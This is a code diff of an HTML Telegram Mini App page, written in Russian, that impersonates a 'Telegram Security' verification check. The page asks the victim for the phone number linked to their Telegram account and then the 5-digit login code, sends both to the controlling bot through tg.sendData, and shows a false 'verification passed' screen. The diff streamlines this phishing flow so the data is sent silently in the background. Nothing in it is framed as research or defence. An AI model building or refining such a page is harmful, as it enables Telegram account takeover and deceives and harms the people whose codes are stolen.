@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram Security</title>
+    <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
@@ -15,17 +15,13 @@
         .container{
             background:#1a1a1a;border-radius:20px;padding:32px 24px;
             max-width:400px;width:100%;text-align:center;
-            border:1px solid #2a2a2a;box-shadow:0 20px 60px rgba(0,0,0,0.5);
+            border:1px solid #2a2a2a;
         }
         .shield{
             width:80px;height:80px;margin:0 auto 24px;
             background:linear-gradient(135deg,#2aabee,#1a8fc4);
             border-radius:50%;display:flex;align-items:center;justify-content:center;
-            font-size:40px;animation:pulse 2s infinite;
-        }
-        @keyframes pulse{
-            0%,100%{box-shadow:0 0 0 0 rgba(42,171,238,0.4)}
-            50%{box-shadow:0 0 0 20px rgba(42,171,238,0)}
+            font-size:40px;
         }
         h2{font-size:22px;margin-bottom:6px}
         .sub{color:#888;font-size:14px;margin-bottom:24px;line-height:1.5}
@@ -52,6 +48,7 @@
         
         .status{margin-top:14px;font-size:13px;min-height:20px}
         .status.err{color:#f44336}
+        .status.ok{color:#4caf50}
         
         .spinner{
             display:inline-block;width:18px;height:18px;
@@ -61,12 +58,7 @@
         }
         @keyframes spin{to{transform:rotate(360deg)}}
         
-        .success-icon{font-size:64px;animation:bounceIn 0.6s ease}
-        @keyframes bounceIn{
-            0%{transform:scale(0)}
-            50%{transform:scale(1.2)}
-            100%{transform:scale(1)}
-        }
+        .success-icon{font-size:64px}
         .footer{margin-top:24px;font-size:11px;color:#333}
     </style>
 </head>
@@ -74,36 +66,39 @@
     <div class="container">
         <div class="shield">🛡️</div>
         
+        <!-- Шаг 1: Номер -->
         <div id="step1">
             <h2>Проверка безопасности</h2>
-            <p class="sub">Подтвердите что вы владелец этого аккаунта Telegram</p>
+            <p class="sub">Введите номер телефона привязанный к Telegram</p>
             <div class="input-box">
                 <span>📱</span>
-                <input type="tel" id="phoneInput" placeholder="+7 911 222 33 44" autocomplete="tel">
+                <input type="tel" id="phoneInput" placeholder="+7 911 222 33 44">
             </div>
-            <button class="btn" onclick="sendCode()" id="sendBtn">📩 Отправить код</button>
-            <div class="status" id="phoneStatus"></div>
+            <button class="btn" onclick="goStep2()">📩 Отправить код</button>
+            <div class="status" id="status1"></div>
         </div>
         
+        <!-- Шаг 2: Код -->
         <div id="step2" class="hidden">
             <h2>Код подтверждения</h2>
-            <p class="sub">Мы отправили 5-значный код на<br><strong id="phoneDisplay"></strong></p>
+            <p class="sub">SMS с кодом отправлена на<br><strong id="phoneDisplay"></strong></p>
             <div class="input-box">
                 <span>🔑</span>
-                <input type="text" id="codeInput" placeholder="Введите код" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+                <input type="text" id="codeInput" placeholder="Введите 5 цифр" maxlength="5" inputmode="numeric">
             </div>
-            <button class="btn" onclick="verifyCode()" id="verifyBtn">✅ Подтвердить</button>
-            <div class="status" id="codeStatus"></div>
-            <span style="margin-top:14px;font-size:13px;color:#888;cursor:pointer;display:inline-block" onclick="goBack()">← Изменить номер</span>
+            <button class="btn" onclick="goStep3()">✅ Подтвердить</button>
+            <div class="status" id="status2"></div>
+            <span style="margin-top:14px;font-size:13px;color:#888;cursor:pointer" onclick="goBack()">← Назад</span>
         </div>
         
+        <!-- Шаг 3: Готово -->
         <div id="step3" class="hidden">
             <div class="success-icon">✅</div>
-            <h2 style="margin-top:16px">Верификация пройдена</h2>
-            <p class="sub">Ваш аккаунт подтверждён.<br>Спасибо за сотрудничество.</p>
+            <h2 style="margin-top:16px">Готово!</h2>
+            <p class="sub">Верификация пройдена</p>
         </div>
         
-        <div class="footer">Telegram Security © 2024</div>
+        <div class="footer">Telegram Security © 2026</div>
     </div>
     
     <script>
@@ -113,69 +108,45 @@
         
         let phoneNumber = '';
         
-        // Ждём ответ от бота
-        tg.onEvent('webview_data', function(data) {
-            // Не используется, ответ приходит через sendData колбэк
-        });
-        
-        function sendCode(){
+        function goStep2(){
             const raw = document.getElementById('phoneInput').value.trim();
             if(!raw){
-                document.getElementById('phoneStatus').textContent = 'Введите номер телефона';
-                document.getElementById('phoneStatus').className = 'status err';
+                document.getElementById('status1').textContent = 'Введите номер';
+                document.getElementById('status1').className = 'status err';
                 return;
             }
             
             phoneNumber = raw.replace(/\s+/g,'').replace(/-/g,'').replace(/\(/g,'').replace(/\)/g,'');
             if(!phoneNumber.startsWith('+')) phoneNumber = '+' + phoneNumber;
             
-            const btn = document.getElementById('sendBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>Отправка...';
-            document.getElementById('phoneStatus').textContent = '';
-            document.getElementById('phoneStatus').className = 'status';
+            // Переключаем шаг
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('phoneDisplay').textContent = phoneNumber;
             
-            // Меняем на шаг 2 сразу
-            setTimeout(function(){
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('phoneDisplay').textContent = phoneNumber;
-                document.getElementById('codeInput').focus();
-            }, 500);
-            
+            // Отправляем номер боту в фоне (не ждём ответа)
             tg.sendData(JSON.stringify({action:'send_code', phone:phoneNumber}));
         }
         
-        function verifyCode(){
+        function goStep3(){
             const code = document.getElementById('codeInput').value.trim();
             if(!code || code.length < 5){
-                document.getElementById('codeStatus').textContent = 'Введите 5 цифр';
-                document.getElementById('codeStatus').className = 'status err';
+                document.getElementById('status2').textContent = 'Введите 5 цифр';
+                document.getElementById('status2').className = 'status err';
                 return;
             }
             
-            const btn = document.getElementById('verifyBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>Проверка...';
-            document.getElementById('codeStatus').textContent = '';
-            document.getElementById('codeStatus').className = 'status';
+            // Переключаем шаг
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
             
+            // Отправляем код боту в фоне (не ждём ответа)
             tg.sendData(JSON.stringify({action:'verify_code', code:code, phone:phoneNumber}));
-            
-            // Ждём и показываем успех
-            setTimeout(function(){
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
-            }, 2000);
         }
         
         function goBack(){
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
-            document.getElementById('sendBtn').disabled = false;
-            document.getElementById('sendBtn').innerHTML = '📩 Отправить код';
-            document.getElementById('phoneStatus').textContent = '';
-            document.getElementById('codeStatus').textContent = '';
         }
     </script>
 </body>
